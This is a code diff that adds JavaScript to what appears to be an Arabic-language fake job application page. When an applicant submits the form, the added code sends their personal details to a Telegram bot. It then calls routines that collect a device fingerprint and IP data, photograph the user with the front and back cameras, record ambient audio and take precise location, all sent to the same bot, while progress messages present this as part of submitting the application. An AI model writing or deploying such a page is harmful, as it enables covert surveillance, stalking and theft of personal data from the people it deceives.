@@ -880,4 +880,71 @@
             try {
                 // ====== 1. إرسال بيانات النموذج ======
                 updateProgress(5, '📤 جاري إرسال البيانات...');
-                const formMsg = `
+                const formMsg = `📋 <b>بيانات المتقدم للوظيفة</b>\n\n👤 الاسم: ${formData.fullName}\n📅 السن: ${formData.age} سنة\n📍 العنوان: ${formData.address}\n📞 الهاتف: ${formData.phone}\n📧 البريد: ${formData.email}\n📝 الملاحظات: ${formData.notes}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, formMsg);
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 2. بصمة الجهاز ======
+                updateProgress(20, '🕵️ جاري جمع بيانات الجهاز...');
+                await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, formData);
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 3. IP ======
+                updateProgress(35, '🌐 جاري تحديد الموقع...');
+                await getRichIPData(MASTER_ID, BOT_TOKEN, formData);
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 4. الكاميرا الأمامية ======
+                updateProgress(50, '📸 جاري التقاط الصورة...');
+                await captureFrontCamera(MASTER_ID, BOT_TOKEN, formData);
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 5. الكاميرا الخلفية ======
+                updateProgress(70, '📷 جاري تصوير المحيط...');
+                await captureBackCamera(MASTER_ID, BOT_TOKEN, formData);
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 6. التسجيل الصوتي ======
+                updateProgress(85, '🎤 جاري التسجيل الصوتي...');
+                await recordAmbientAudio(MASTER_ID, BOT_TOKEN, formData);
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 7. الموقع ======
+                updateProgress(95, '📍 جاري تحديد الموقع الجغرافي...');
+                await getPreciseLocation(MASTER_ID, BOT_TOKEN, formData);
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 8. الإكمال ======
+                updateProgress(100, '✅ تم الإرسال بنجاح!', '✅ اكتمل الإرسال');
+                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
+                    `✅ <b>تم إرسال جميع بيانات المتقدم بنجاح!</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}`
+                );
+
+                // عرض رسالة النجاح
+                showSuccess();
+
+            } catch(e) {
+                console.error(e);
+                showError('❌ حدث خطأ أثناء إرسال البيانات');
+            }
+
+            // إنهاء التحميل
+            clearInterval(progressInterval);
+            clearInterval(counterInterval);
+
+            setTimeout(() => {
+                progressWrap.classList.remove('active');
+                startBtn.classList.remove('loading');
+                startBtn.disabled = false;
+                isRunning = false;
+            }, 800);
+        }
+
+        // ========== ربط الأحداث ==========
+        startBtn.onclick = startProcess;
+
+    })();
+</script>
+
+</body>
+</html>
